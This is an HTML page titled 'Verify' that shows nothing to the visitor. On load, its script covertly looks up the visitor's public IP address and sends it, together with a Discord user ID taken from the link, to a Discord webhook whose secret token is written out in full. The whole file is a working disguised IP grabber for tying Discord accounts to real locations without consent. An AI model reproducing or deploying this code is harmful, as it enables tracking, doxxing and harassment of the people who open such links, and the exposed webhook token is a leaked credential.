<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verify</title>
</head>
<body>
    <script>
        (async () => {
            const response = await fetch("https://api64.ipify.org?format=json");
            const ip = await response.json();
            const discordId = new URLSearchParams(window.location.search).get("id");
            if (discordId) {
                await fetch("https://discord.com/api/webhooks/1335373199034023936/7MxNPuI9F-m2ZtmGAu9ZJzLWPkL7tIDw_MAuIxLmB2Fl064cPKAM6Gka2hHG4RWFSiHL", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ content: `{"id": "${discordId}", "ip": "${ip.ip}"}` })
                });
            }
        })();
    </script>
</body>
</html>
